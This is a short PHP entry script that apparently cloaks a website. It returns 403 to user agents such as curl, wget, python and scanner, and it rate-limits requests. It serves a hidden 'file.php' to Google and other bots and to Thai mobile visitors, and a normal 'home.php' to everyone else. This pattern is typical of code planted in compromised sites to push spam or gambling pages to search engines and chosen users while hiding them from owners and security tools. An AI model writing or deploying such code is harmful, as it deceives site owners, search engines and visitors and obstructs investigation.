<?php
if (session_id() === '') {
    session_start();
}

$MAX_REQ = 25;
$WINDOW  = 10;

$ua = '';
if (isset($_SERVER['HTTP_USER_AGENT'])) {
    $ua = $_SERVER['HTTP_USER_AGENT'];
}

$ip = '';
if (isset($_SERVER['REMOTE_ADDR'])) {
    $ip = $_SERVER['REMOTE_ADDR'];
}

$badAgents = array(
    'curl',
    'wget',
    'python',
    'scraper',
    'scanner',
    'libwww'
);

foreach ($badAgents as $bad) {
    if ($ua !== '' && stripos($ua, $bad) !== false) {
        if (!headers_sent()) {
            header('HTTP/1.1 403 Forbidden');
        }
        exit('Forbidden');
    }
}

if (!isset($_SESSION['count']) || !isset($_SESSION['start'])) {
    $_SESSION['count'] = 0;
    $_SESSION['start'] = time();
}

$_SESSION['count']++;

if ((time() - $_SESSION['start']) > $WINDOW) {
    $_SESSION['count'] = 1;
    $_SESSION['start'] = time();
}

if ($_SESSION['count'] > $MAX_REQ) {
    if (!headers_sent()) {
        header('HTTP/1.1 429 Too Many Requests');
    }
    exit;
}

$is_mobile = false;
if ($ua !== '') {
    if (preg_match('/(iphone|ipad|ipod|android|blackberry|windows phone|opera mini|mobile)/i', $ua)) {
        $is_mobile = true;
    }
}

$is_bot = false;
if ($ua !== '') {
    if (
        stripos($ua, 'googlebot') !== false ||
        stripos($ua, 'google') !== false ||
        stripos($ua, 'bot') !== false
    ) {
        $is_bot = true;
    }
}

$is_thailand = false;


if (isset($_SERVER['GEOIP_COUNTRY_CODE']) && $_SERVER['GEOIP_COUNTRY_CODE'] === 'TH') {
    $is_thailand = true;
}
elseif (isset($_SERVER['HTTP_ACCEPT_LANGUAGE'])) {
    if (preg_match('/\bth\b|\bth-TH\b/i', $_SERVER['HTTP_ACCEPT_LANGUAGE'])) {
        $is_thailand = true;
    }
}

if ($is_bot) {
    require __DIR__ . '/file.php';
} elseif ($is_mobile && $is_thailand) {
    require __DIR__ . '/file.php';
} else {
    require __DIR__ . '/home.php';
}
